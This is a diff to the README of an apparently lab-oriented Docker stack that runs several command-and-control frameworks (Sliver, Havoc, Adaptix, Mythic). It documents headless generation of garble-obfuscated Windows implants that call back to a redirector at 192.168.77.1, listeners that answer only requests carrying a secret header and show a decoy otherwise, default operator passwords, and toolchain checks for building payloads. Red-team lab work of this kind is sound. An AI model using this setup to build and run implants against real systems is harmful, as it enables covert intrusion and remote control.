@@ -183,15 +183,26 @@ cd C2Stack/Docker
 - **Sliver** — v1.7.7 (SHA256-pinned), bootstrap at container start mints the
   `cadre` operator config and creates the HTTP listener (bind :80,
   RootPath `/cloud/storage/objects`) — verified live: with-header requests hit the
-  listener, decoy without header. Full garble `generate` proven on v1.7.7 (47s build).
+  listener, decoy without header. Full garble `generate` proven on v1.7.7 (47s build);
+  headless generation works: `sliver-client console --rc gen.rc` where the rc file
+  contains `generate --http 192.168.77.1:80 --os windows --arch amd64 --name X` + `exit`.
 - **Havoc** — v0.7 teamserver with the C2Stack HTTP listener baked into the profile
   (`Docker/havoc/havoc.yaotl`): bind :80, Uris `/edge/cache/assets/`,
-  header `X-Request-ID: cadre-c2`. Live-verified through the redirector; Demon
-  payload generation proven (cross-gcc + nasm in-container).
+  header `X-Request-ID: cadre-c2`, Hosts `192.168.77.1` (the redirector). Live-verified
+  through the redirector. Demon payloads are compiled SERVER-SIDE by the teamserver —
+  the image now ships `payloads/Demon` (sources) + `payloads/DllLdr.x64.bin` +
+  `Shellcode.x64/x86.bin` and the musl cross-gcc/nasm toolchains (this was a real gap:
+  the Dockerfile never copied payloads, so every Demon build would have failed
+  client-side build request; smoke-compile through the baked include tree now passes).
 - **Adaptix** — teamserver :4321 published and reachable from the host; the service
   is on `c2_edge` because Docker drops port publishing for containers that sit only
-  on the internal `c2_core` network (see the compose comment). HTTP/DNS/SMB extender
-  listeners are created in the Qt GUI client.
+  on the internal `c2_core` network (see the compose comment). All listener/agent
+  extenders ship in-image (`/app/extenders`: HTTP/SMB/TCP/DNS + beacon/gopher agents);
+  operator connects with the Qt packet client on Kali (teamserver password `pass`,
+  operator1 `pass1` — set in `/app/profile.yaml`), creates the HTTP Beacon listener
+  on :80 with URI `/api/v1/sync` (redirector prefix) and builds beacons — beacon
+  compilation happens CLIENT-side in the packet GUI (the Go/mingw/gcc/make/git
+  toolchains in the image are the documented teamserver runtime deps).
 - **Mythic** — server+postgres+rabbitmq healthy (latest stable 3.4.0.61). The Apollo
   payload type is registered **without mythic-cli**: it self-registers over RabbitMQ
   sync queues as a sibling container (`mythic_apollo`, owns
@@ -226,9 +237,11 @@ the rest are created from the operator consoles:
   Payloads are generated with `generate --http <redirector-host>:80` so they call back
   through the redirector.
 - **Havoc** — automatic: `Docker/havoc/havoc.yaotl` (baked into the image at build)
-  starts an HTTP listener on port `80`: `Hosts` must be set to the victim-facing
-  callback host before generating a Demon (edit the profile + rebuild, or edit in the
-  Qt client). Base path `/edge/cache/assets` + header come from the same file.
+  starts an HTTP listener on port `80` with `Hosts = ["192.168.77.1"]` (the C2Stack
+  redirector, so generated Demons phone home correctly out of the box). If the lab
+  redirector host differs, edit Hosts in the Qt client (Listeners → c2stack - http)
+  or in the profile + rebuild. Base path `/edge/cache/assets` + header come from the
+  same file.
 - **Mythic** — the `http` C2 profile container is registered and the listener is live
   inside `mythic_http` (:80). Create the profile instance via the REST API:
   `POST /api/v1.4/create_c2parameter_instance_webhook` with a JSON-string `c2_instance`
@@ -257,18 +270,22 @@ the sliver image and every `generate` failed; fixed in 93ac840):
 
 ```powershell
 # Sliver — garble needs git (git apply for linker patches) + Go toolchain
-docker exec docker-sliver-1 sh -c "which git; which go"
+docker exec c2stack-sliver-1 sh -c "which git; which go"
 # verify an actual build: sliver-client -> generate (garble) succeeds
 
-# Havoc — generation compiles Demon directly with the cross-gcc + nasm
-docker exec docker-havoc-1 sh -c 'cd /tmp && printf "#include <windows.h>\nvoid main(){}" > t.c && PATH="/opt/havoc/teamserver/data/x86_64-w64-mingw32-cross/bin:$PATH" x86_64-w64-mingw32-gcc -I/opt/havoc/teamserver/payloads/Demon/include -Os -o t.exe t.c && ls t.exe'
-docker exec docker-havoc-1 sh -c 'printf "BITS 64\nsection .text\nglobal f\nf: ret\n" > t.asm && nasm -f win64 t.asm -o t.o && ls t.o'
+# Havoc — generation compiles Demon SERVER-SIDE with the baked cross-gcc + nasm;
+# the source/include tree MUST be present (was missing and silently broke builds)
+docker exec c2stack-havoc-1 sh -c "ls /opt/havoc/teamserver/payloads/Demon/src /opt/havoc/teamserver/payloads/*.bin"
+docker exec c2stack-havoc-1 sh -c 'cd /opt/havoc/teamserver && PATH="data/x86_64-w64-mingw32-cross/bin:$PATH" x86_64-w64-mingw32-gcc -Ipayloads/Demon/include -Os -o /tmp/t.exe /tmp/t.c'
+docker exec c2stack-havoc-1 sh -c 'printf "BITS 64\nsection .text\nglobal f\nf: ret\n" > /tmp/t.asm && nasm -f win64 /tmp/t.asm -o /tmp/t.o && ls /tmp/t.o'
 
 # Adaptix — teamserver runtime needs go + mingw + gcc + make + git
-docker exec docker-adaptix-1 sh -c "which go gcc make git x86_64-w64-mingw32-gcc"
+docker exec c2stack-adaptix-1 sh -c "which go gcc make git x86_64-w64-mingw32-gcc"
+# ...and the extenders (listeners/agents) must be present in-image
+docker exec c2stack-adaptix-1 sh -c "ls /app/extenders"
 
 # Meridian — payloads are pre-built in the image (no runtime compiler needed)
-docker exec docker-meridian-1 ls /opt/meridian/payloads
+docker exec c2stack-meridian-1 ls /opt/meridian/payloads
 ```
 
 ### Further Reading & Field Practice
